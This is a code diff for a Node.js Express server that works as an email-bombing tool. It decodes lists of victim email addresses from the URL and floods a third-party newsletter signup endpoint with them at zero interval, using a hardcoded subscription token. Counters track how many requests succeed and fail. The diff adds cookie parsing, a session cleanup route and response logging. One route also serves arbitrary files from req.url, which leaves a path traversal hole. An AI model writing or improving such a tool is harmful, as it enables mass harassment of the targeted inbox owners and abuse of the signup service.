@@ -1,17 +1,23 @@
-import express from 'express';
-import fetch from 'node-fetch';
-import path from 'path';
-import { v4 as uuidv4 } from 'uuid'; // for generating unique session IDs
+import express from "express";
+import fetch from "node-fetch";
+import path from "path";
+import { v4 as uuidv4 } from "uuid"; // for generating unique session IDs
 
 const __dirname = process.cwd();
 const app = express();
 let stopFlag = false;
-
+function removeElementFromArray(array, elementToRemove) {
+    const index = array.indexOf(elementToRemove);
+    if (index !== -1) {
+        array.splice(index, 1);
+    }
+    return array;
+}
 const sessions = {}; // To store data for each session
 
 function spam(sessionId, theemail) {
     if (stopFlag) {
-        console.log('Spam operation stopped.');
+        console.log("Spam operation stopped.");
         return;
     }
 
@@ -36,13 +42,17 @@ function spam(sessionId, theemail) {
         },
         body: `{"email":"${theemail}","sub":"m40186,m40183","token":"vDZ3zu26GBfyrHadfFbi0Zvnhfsa_jsBAyPrIbgcy3I","mCodeOptin":"m40183"}`
     })
-    .then(() => {
-        sessions[sessionId].num++;
-    })
-    .catch((e) => {
-        sessions[sessionId].errs++;
-        sessions[sessionId].errorMessages.push(e.message);
-    });
+        .then((response) => {
+            sessions[sessionId].num++;
+            return response.text();
+        })
+        .then((text) => {
+            console.log(text);
+        })
+        .catch((e) => {
+            sessions[sessionId].errs++;
+            sessions[sessionId].errorMessages.push(e.message);
+        });
 }
 
 function executeSpam(sessionId, emails, emailCount, emailsToSpam, interval) {
@@ -53,7 +63,7 @@ function executeSpam(sessionId, emails, emailCount, emailsToSpam, interval) {
     const intervalId = setInterval(() => {
         if (stopFlag || spamCount >= totalSpams) {
             clearInterval(intervalId);
-            console.log('All emails processed.');
+            console.log("All emails processed.");
             return;
         }
 
@@ -66,32 +76,47 @@ function executeSpam(sessionId, emails, emailCount, emailsToSpam, interval) {
 }
 
 app.use(express.static("static"));
-
-app.get('/sendMail/:id1/:id2/index.html', (req, res) => {
+app.use((req, res, next) => {
+    const {
+        headers: { cookie },
+    } = req;
+    if (cookie) {
+        const values = cookie.split(";").reduce((res, item) => {
+            const data = item.trim().split("=");
+            return { ...res, [data[0]]: data[1] };
+        }, {});
+        res.locals.cookie = values;
+    } else res.locals.cookie = {};
+    next();
+});
+app.get("/sendMail/:id1/:id2/index.html", (req, res) => {
     try {
         const sessionId = uuidv4(); // Generate a unique session ID
         sessions[sessionId] = { num: 0, errs: 0, errorMessages: [] }; // Initialize session data
 
-        const id1 = Buffer.from(req.params.id1, 'base64').toString('utf-8');
-        const id2 = Buffer.from(req.params.id2, 'base64').toString('utf-8');
-        const emails = id1.split(',');
+        const id1 = Buffer.from(req.params.id1, "base64").toString("utf-8");
+        const id2 = Buffer.from(req.params.id2, "base64").toString("utf-8");
+        const emails = id1.split(",");
         const emailCount = emails.length;
         const emailsToSpam = Number(id2);
-        
+
         // Define interval in milliseconds
         const interval = 0; // Example: 1000ms = 1 second
 
         // Execute the spam function without waiting for it
         executeSpam(sessionId, emails, emailCount, emailsToSpam, interval);
 
-        res.cookie('sessionId', sessionId, { httpOnly: true }); // Store session ID in a cookie
-        res.sendFile(path.join(__dirname, 'spamPages', 'spam.html'));
+        res.cookie("sessionId", sessionId, { httpOnly: true }); // Store session ID in a cookie
+        res.sendFile(path.join(__dirname, "spamPages", "spam.html"));
     } catch (e) {
-        res.status(500).send("Sorry, but there was an error. Maybe you put too big of a number. \n\n\n\n" + e);
+        res.status(500).send(
+            "Sorry, but there was an error. Maybe you put too big of a number. \n\n\n\n" +
+                e,
+        );
     }
 });
 
-app.get('/sendMail/:id1/:id2/:id3', (req, res) => {
+app.get("/sendMail/:id1/:id2/:id3", (req, res) => {
     try {
         res.sendFile(path.join(__dirname, req.url));
     } catch (e) {
@@ -100,38 +125,46 @@ app.get('/sendMail/:id1/:id2/:id3', (req, res) => {
 });
 
 // Endpoint to stop the spam operation
-app.post('/stopSpam', (req, res) => {
+app.post("/stopSpam", (req, res) => {
     stopFlag = true;
-    res.send('Spam operation stopped.');
+    res.send("Spam operation stopped.");
+});
+app.post("/cleanUp", (req, res) => {
+    const sessionId = res.locals.cookie.sessionId;
+    if (sessions[sessionId]) {
+        delete sessions[sessionId];
+    }
+    res.clearCookie("sessionId");
+    res.send("Cleared session data.");
 });
 
-app.get('/num.txt', (req, res) => {
-    const sessionId = req.cookies.sessionId; // Retrieve session ID from cookie
+app.get("/num.txt", (req, res) => {
+    const sessionId = res.locals.cookie.sessionId; // Retrieve session ID from cookie
     if (sessions[sessionId]) {
         res.send(sessions[sessionId].num.toString());
     } else {
-        res.status(404).send('Session not found');
+        res.status(404).send("Session not found");
     }
 });
 
-app.get('/errs.txt', (req, res) => {
-    const sessionId = req.cookies.sessionId;
+app.get("/errs.txt", (req, res) => {
+    const sessionId = res.locals.cookie.sessionId;
     if (sessions[sessionId]) {
         res.send(sessions[sessionId].errs.toString());
     } else {
-        res.status(404).send('Session not found');
+        res.status(404).send("Session not found");
     }
 });
 
-app.get('/errmessages.txt', (req, res) => {
-    const sessionId = req.cookies.sessionId;
+app.get("/errmessages.txt", (req, res) => {
+    const sessionId = res.locals.cookie.sessionId;
     if (sessions[sessionId]) {
-        res.send(sessions[sessionId].errorMessages.join('\n'));
+        res.send(sessions[sessionId].errorMessages.join("\n"));
     } else {
-        res.status(404).send('Session not found');
+        res.status(404).send("Session not found");
     }
 });
 
 app.listen(8080, () => {
-    console.log('Server is running on port 8080');
+    console.log("Server is running on port 8080");
 });
